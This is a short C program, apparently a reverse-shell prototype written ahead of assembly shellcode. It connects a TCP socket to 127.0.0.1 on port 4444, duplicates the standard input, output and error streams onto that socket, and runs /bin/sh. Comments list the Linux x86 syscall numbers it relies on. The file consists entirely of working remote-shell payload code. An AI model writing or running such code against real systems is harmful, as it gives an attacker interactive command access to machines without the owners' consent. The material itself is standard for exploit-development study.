#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main(void) {
  int sock, c=2;
  struct sockaddr_in srv;

  // socket()
  // #define __NR_socketcall 102  (/usr/include/asm/unistd_32.h)
  // #define SYS_SOCKET      1    (/usr/include/linux/net.h)
  // sock = socket(AF_INET, SOCK_STREAM, 0);
  sock = socket(2, 1, 0);

  //srv.sin_family = AF_INET;
  srv.sin_family = 2;
  srv.sin_port = htons(4444);
  srv.sin_addr.s_addr = inet_addr("127.0.0.1");

  // connect()
  // #define __NR_socketcall 102
  // #define SYS_CONNECT     3
  // connect(sock, (struct sockaddr *) &srv, sizeof(srv));
  connect(sock, (struct sockaddr *) &srv, 16);

  // dup2()
  // #define __NR_dup2 63
  // dup2(csock, STD*_FILENO);
  while (c>=0) {
    dup2(sock, c);
    c--;
  }

  // execve()
  // #define __NR_execve 11
  execve("/bin/sh",0,0);
}
